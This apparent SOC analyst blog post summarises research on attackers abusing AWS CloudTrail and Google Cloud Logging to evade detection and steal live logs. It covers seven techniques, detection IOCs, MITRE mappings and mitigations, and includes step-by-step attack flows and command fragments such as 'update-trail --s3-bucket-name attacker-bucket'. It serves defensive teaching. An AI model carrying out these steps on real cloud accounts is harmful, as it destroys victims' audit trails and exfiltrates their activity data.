# Blinding the Watchmen: Abusing AWS CloudTrail & Google Cloud Logging — 2026-06-09

> **Weekly Breach Investigation**
> *Week 06 · Cloud Defense Evasion · Log Manipulation · Continuous Visibility · Espionage-Capable TTPs*

---

## 1. Executive Summary

Unit 42 (Palo Alto Networks) published research on June 9, 2026 documenting two categories of attacker technique that weaponise cloud logging services, AWS CloudTrail and Google Cloud Logging, against the organisations that depend on them: **defense evasion** (blinding SIEM/SOAR/CSPM tooling by destroying or corrupting log flows) and **continuous visibility** (silently redirecting live logs to attacker-controlled infrastructure for persistent discovery).

Any organisation running workloads on AWS or Google Cloud whose IAM permissions allow modification of CloudTrail trails, S3 log buckets, Cloud Logging sinks, or KMS encryption keys is exposed to these techniques, which require no novel exploit code only overly permissive IAM grants.

The impact ranges from a complete blind spot during an active intrusion to silent, real-time intelligence collection on every API call made inside a victim's cloud account, a capability previously associated exclusively with nation-state actors, now achievable by any attacker who obtains a sufficiently privileged credential.

---

## 2. Attack Techniques Overview

These are **documented TTPs**, not a single incident. They have been observed in the wild and corroborated by Mandiant's H1 2026 Cloud Threat Horizons report, which confirmed that **all major ransomware groups** were actively deleting logs, core dumps, and backups in late 2025 to hinder forensic investigations.

| Objective | Technique | Cloud Platform |
|---|---|---|
| Defense Evasion | Stop Logging (StopLogging / sink disable) | AWS · GCP |
| Defense Evasion | Delete Log Storage Destination (S3 bucket / log bucket) | AWS · GCP |
| Defense Evasion | Delete Log Router (delete-trail / DeleteSink) | AWS · GCP |
| Defense Evasion | Impair Logging via Attacker-Controlled KMS Key | AWS · GCP |
| Defense Evasion | Log Poisoning (overwrite log objects in S3 / Cloud Storage) | AWS · GCP |
| Continuous Visibility | Create New Log Router to Attacker-Controlled Destination | AWS · GCP |
| Continuous Visibility | Log Redirection (update trail/sink destination) | AWS · GCP |

---

## 3. How the Attacks Work

### Architecture: How Cloud Logging Normally Functions

```
AWS Environment                        Google Cloud Environment
───────────────                        ────────────────────────
API Calls / Events                     API Calls / Events
       │                                       │
       ▼                                       ▼
  CloudTrail Trail                       Logging Sink
  (configuration)                      (router/filter)
       │                                       │
       ▼                                       ▼
   S3 Bucket ◄─── logs stored here    Log Bucket ◄─── logs stored here
       │                                       │
       ▼                                       ▼
SIEM / SOAR / CSPM tooling            SIEM / SOAR / CSPM tooling
```

---

### Defense Evasion Techniques

**Technique 1 : Stop Logging**

The most direct method. One API call creates an immediate visibility gap.

- **AWS:** `cloudtrail:StopLogging` permission → `stop-logging` API call on a specific trail. No further logs written to S3.
- **GCP:** `logging.sinks.update` permission → set `disabled: true` on the sink. New logs are lost unless captured by another sink.

**Technique 2 : Delete Log Storage Destination**

Destroy the bucket where logs land. The trail/sink still exists but has nowhere to write.

- **AWS:** `s3:DeleteBucket` + `s3:DeleteObject` permissions → `delete-bucket` API. CloudTrail UI displays *"Bucket doesn't exist"* within minutes.
- **GCP:** `logging.buckets.delete` permission → delete-bucket command. Bucket enters `DELETE_REQUESTED` state for 7 days before permanent deletion. **Mitigation bypass:** if the bucket is not *locked*, this succeeds.

**Technique 3 : Delete Log Router**

Delete the routing resource itself rather than its destination.

- **AWS:** `delete-trail` API.
- **GCP:** `google.logging.v2.ConfigServiceV2.DeleteSink`.

**Technique 4 : Impair Logging via Attacker-Controlled KMS Key**

Most sophisticated evasion technique. Logs appear to be configured correctly but cannot be encrypted or read.

```
Attack flow (AWS):
Step 1: Attacker creates external KMS key with a policy granting CloudTrail encrypt access
Step 2: Attacker calls update-trail → switches trail's KMS key to attacker-controlled key
Step 3: Attacker removes CloudTrail's access to that key (delete or policy modification)
Result: CloudTrail shows "Bucket access denied", logs stop being written
        Victim cannot revert without attacker cooperation, the key is external
```

- **GCP equivalent:** Modify a CMEK-configured log bucket to use an attacker-controlled external key, then revoke decrypt access. The UI returns *"rekeying requires that the CMEK service account has decrypt access to the current CMEK key"*, the victim is locked out of their own logs.

**Technique 5 : Log Poisoning**

Retroactive manipulation of stored log files to erase evidence of attacker actions.

- **AWS:** `s3:GetObject` + `s3:PutObject` on the log bucket → download log JSON, remove or alter specific event records, re-upload (overwriting original). Breaks chain of custody. Amazon Athena queries on the bucket return manipulated data.
- **GCP:** `storage.objects.get` + `storage.objects.create` → same download/overwrite technique on the Cloud Storage sink destination.
- **Countermeasure:** AWS CloudTrail log file integrity validation (enabled by default via Console, **NOT** via API/CLI) creates a cryptographic digest chain. If the digest files are intact, poisoning is detectable.

---

### Continuous Visibility Techniques

Once inside, sophisticated attackers don't just evade detection, they *become* the monitoring system.

**Technique 6 : Create New Log Router to Attacker-Controlled Destination**

```
Attacker (external)                 Victim AWS Account
───────────────────                 ─────────────────
Attacker-controlled S3 bucket  ◄──  New trail created by attacker
                                    (create-trail --s3-bucket-name attacker-bucket)

Attacker-controlled GCP resource ◄── New sink created by attacker
                                     (logging.sinks.create DESTINATION=attacker-resource)

Result: Every API call in victim's account now streams to attacker in real-time
        Victim's own SIEM continues receiving logs normally — no immediate alert
```

**Technique 7 : Log Redirection**

Simpler than creating a new router, just update the existing one's destination.

- **AWS:** `update-trail --s3-bucket-name attacker-bucket` → all logs now flow to attacker. Original trail *appears* healthy in console.
- **GCP:** `logging.sinks.update` with a new DESTINATION → same result.

This gives attackers passive, real-time visibility into: new VM deployments, IAM policy changes, sensitive data access patterns, credential rotation events — without running any noisy discovery commands that might trigger alerts.

---

## 4. MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Valid Accounts (compromised IAM credentials used to access logging APIs) | [T1078](https://attack.mitre.org/techniques/T1078/) |
| Defense Evasion | Disable or Modify Cloud Logs (StopLogging / sink disable) | [T1562.008](https://attack.mitre.org/techniques/T1562/008/) |
| Defense Evasion | Indicator Removal: Clear Cloud Logs (delete trail, delete bucket, delete sink) | [T1070.009](https://attack.mitre.org/techniques/T1070/009/) |
| Defense Evasion | Indicator Removal: Log Poisoning (overwrite S3/GCS log objects) | [T1070](https://attack.mitre.org/techniques/T1070/) |
| Defense Evasion | Obfuscated Files or Information (KMS key swap renders logs unreadable) | [T1027](https://attack.mitre.org/techniques/T1027/) |
| Discovery | Cloud Service Discovery (real-time log access reveals entire cloud footprint) | [T1526](https://attack.mitre.org/techniques/T1526/) |
| Collection | Data from Cloud Storage (log poisoning via S3 GetObject/PutObject) | [T1530](https://attack.mitre.org/techniques/T1530/) |
| Exfiltration | Transfer Data to Cloud Account (redirecting live log stream to attacker S3/GCP resource) | [T1537](https://attack.mitre.org/techniques/T1537/) |
| Persistence | Account Manipulation (creating new trail/sink with attacker-controlled destination) | [T1098](https://attack.mitre.org/techniques/T1098/) |

---

## 5. Detection Opportunities

### Log Sources

- **AWS CloudTrail management events** : the trail you're protecting also logs changes to itself (meta-logging): look for `StopLogging`, `DeleteTrail`, `UpdateTrail`, `DeleteBucket`, `PutBucketPolicy` events
- **AWS CloudWatch / EventBridge** : alert on `CreateTrail` events with non-baseline `s3BucketName` values
- **AWS Config** : continuous configuration recording will capture trail and S3 bucket state changes
- **Google Cloud Audit Logs** : `google.logging.v2.ConfigServiceV2.UpdateSink`, `DeleteSink`, `DeleteBucket` events in the Admin Activity log
- **Google Cloud Asset Inventory** : monitors changes to log bucket and sink configurations across the organisation


### IOCs

| Type | Value / Description |
|---|---|
| AWS API call — evasion | `StopLogging` via CloudTrail API (non-console agent) |
| AWS API call — evasion | `DeleteTrail` via CloudTrail API |
| AWS API call — evasion | `UpdateTrail` with external `kmsKeyId` |
| AWS API call — evasion | `DeleteBucket` targeting a trail's configured S3 bucket |
| AWS API call — exfiltration | `UpdateTrail` with `s3BucketName` not owned by the org |
| AWS API call — exfiltration | `CreateTrail` with `s3BucketName` not in org account |
| GCP API call — evasion | `ConfigServiceV2.UpdateSink` with `disabled: true` |
| GCP API call — evasion | `ConfigServiceV2.DeleteSink` |
| GCP API call — exfiltration | `ConfigServiceV2.UpdateSink` with external project `destination` |
| GCP API call — exfiltration | `ConfigServiceV2.CreateSink` with external project `destination` |
| Behavioural indicator | `PutObject` to CloudTrail log bucket by non-AWSService principal |
| Behavioural indicator | CloudTrail console shows "Bucket doesn't exist" or "Bucket access denied" |

---

## 6. Recommended Mitigations

1. **Apply strict least-privilege IAM for all logging-adjacent permissions**
   No human identity should have `cloudtrail:StopLogging`, `cloudtrail:DeleteTrail`, `cloudtrail:UpdateTrail`, `s3:DeleteBucket`, or `logging.sinks.update` as standing permissions. These should be granted only via break-glass procedures with MFA and require dual approval. Audit with AWS IAM Access Analyzer and GCP Policy Analyzer.

2. **Send CloudTrail management events to an independent, isolated account**
   Store logs in a dedicated AWS security/logging account with a separate AWS Organization SCP that denies `cloudtrail:StopLogging` and `s3:DeleteBucket` for the log bucket from all non-security-admin principals. An attacker who compromises a workload account cannot tamper with logs in an account they don't have access to.

3. **Use S3 Object Lock on CloudTrail log buckets**
   Enable S3 Object Lock in Compliance mode on the bucket receiving CloudTrail logs. This makes individual log objects immutable for the defined retention period, even the root account cannot delete them. This directly prevents log poisoning (Technique 5).

4. **Alert on all trail and sink configuration changes in real-time via EventBridge / GCP Alerting**
   `CreateTrail`, `UpdateTrail`, `DeleteTrail`, `StopLogging` and their GCP equivalents should trigger immediate PagerDuty/OpsGenie alerts, not just SIEM ingestion. A change to logging configuration during an active incident is one of the highest-confidence signals of an attacker attempting to extend dwell time.

---

## 7. Analyst Notes

**What I learned**

Cloud logging infrastructure is a high-value lateral target, not just a passive record-keeper. Once an attacker has IAM permissions to modify trail or sink configuration, they can simultaneously destroy evidence of their presence *and* establish persistent intelligence collection on the victim's entire cloud footprint. This is a two-for-one that I hadn't fully appreciated before mapping all seven techniques together. The permissions required — `cloudtrail:UpdateTrail`, `logging.sinks.update` — sound administrative, not attacker-relevant, which is exactly why they end up over-granted in real environments.

**What surprised me**

The KMS key swap attack (Technique 4) is particularly elegant and brutal. It's not deleting anything — the trail still exists, the bucket still exists, logging appears healthy in the console. But because the encryption key is now inaccessible, no logs are written. And because the attacker controls the external key, the victim *cannot revert this without the attacker's cooperation*. It's a hostage situation against your own audit trail. The fact that this can be accomplished with just two API calls (`create-key` + `update-trail`) makes it accessible to any attacker with stolen CloudTrail admin credentials.

---

## 8. Risk Assessment by Technique

| Technique | Likelihood Malicious | Impact | Ease of Execution |
|---|---|---|---|
| Stop Logging | High | Complete visibility loss | Low (1 API call) |
| Delete Log Storage | High | Complete visibility loss | Low (2 API calls) |
| Delete Log Router | High | Complete visibility loss | Low (1 API call) |
| KMS Key Swap | Very High | Visibility loss + unrecoverable | Medium (3–4 API calls) |
| Log Poisoning | High | Chain of custody broken | Medium (IAM + S3 access needed) |
| Create New Log Router | Medium (could be legitimate) | Silent real-time log theft | Medium |
| Log Redirection | High | Silent real-time log theft | Low (1 API call) |

---

## 9. References

- [Unit 42 — Blinding the Watchmen: Abusing Cloud Logging Services for Defense Evasion and Visibility](https://unit42.paloaltonetworks.com/cloud-logging-defense-evasion/) — primary research, June 9, 2026
- [Mandiant / Google Cloud — H1 2026 Cloud Threat Horizons Report](https://cloud.google.com/security/report/resources/cloud-threat-horizons-report-h1-2026) — real-world corroboration
- [AWS CloudTrail Log File Integrity Validation documentation](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-log-file-validation-intro.html)
- [Google Cloud — Locking Log Buckets](https://docs.cloud.google.com/logging/docs/buckets#locking-logs-buckets)
- [MITRE ATT&CK T1562.008 — Disable or Modify Cloud Logs](https://attack.mitre.org/techniques/T1562/008/)
- [Splunk Security Content — AWS Defense Evasion Detection Rules](https://research.splunk.com/detections/platforms/aws/)
- [Cyberpress — Attackers Weaponize AWS and Google Logs for Stealthy Exfiltration](https://cyberpress.org/cloud-logs-enable-exfiltration/)

---

<sub>Part of the <strong>Weekly Breach Investigation</strong> series · Investigating one real-world breach or TTP per week to build practical SOC analyst skills · <a href="https://attack.mitre.org">attack.mitre.org</a></sub>